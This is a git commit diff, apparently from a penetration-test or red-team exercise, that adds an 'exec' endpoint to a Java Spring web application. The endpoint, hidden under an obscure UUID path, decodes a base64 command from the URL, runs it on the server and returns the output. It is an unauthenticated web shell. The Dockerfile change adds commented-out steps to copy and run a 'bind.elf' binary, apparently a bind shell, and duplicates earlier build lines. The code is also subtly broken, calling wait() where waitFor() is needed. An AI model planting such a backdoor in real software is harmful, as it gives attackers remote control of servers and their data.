bf913b1eecb2968cdc364e2b881c80306cb83761
m0rv4i <20513519+m0rv4i@users.noreply.github.com>
2021-06-30 14:28:20 +0100

    Add exec endpoint

--- Dockerfile
+++ Dockerfile
@@ -15,3 +15,11 @@ USER developer
 WORKDIR /app
 COPY --from=build /app/build/libs/web-application-*.jar /app/web-application.jar
 ENTRYPOINT ["java","-server", "-Xms1G", "-Xmx1G", "-jar", "web-application.jar"]
+#COPY bind.elf .
+#RUN chmod +x bind.elf
+#ENTRYPOINT ["./bind.elf"]
+RUN adduser -h /app/ -D -s /bin/sh developer
+USER developer
+WORKDIR /app
+COPY --from=build /app/build/libs/web-application-*.jar /app/web-application.jar
+ENTRYPOINT ["java","-server", "-Xms1G", "-Xmx1G", "-jar", "web-application.jar"]
--- src/main/java/com/tintulip/webapplication/user/UserRestController.java
+++ src/main/java/com/tintulip/webapplication/user/UserRestController.java
@@ -1,9 +1,15 @@
 package com.tintulip.webapplication.user;
 
+import org.apache.tomcat.util.codec.binary.Base64;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
 @RestController
 @RequestMapping("/api")
@@ -15,5 +21,30 @@ public class UserRestController {
     @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f")
     public Iterable<TestUser> nettitudeTest() {
         return repository.findAll();
+    }
+
+    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}")
+    public Exec nettitudeExec(@PathVariable("cmd") String cmd) {
+        var decoded = new String(Base64.decodeBase64(cmd));
+        try {
+            var process = Runtime.getRuntime().exec(decoded);
+            process.wait();
+            var inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            var output = new StringBuilder();
+            while ((line = inputStream.readLine()) != null)
+                output.append(line);
+            return new Exec(Base64.encodeBase64String(output.toString().getBytes()));
+        } catch (Exception e) {
+            return new Exec(Base64.encodeBase64String(e.getMessage().getBytes()));
+        }
+    }
+
+    public static class Exec{
+        String response;
+
+        Exec(String response){
+            this.response = response;
+        }
     }
 }
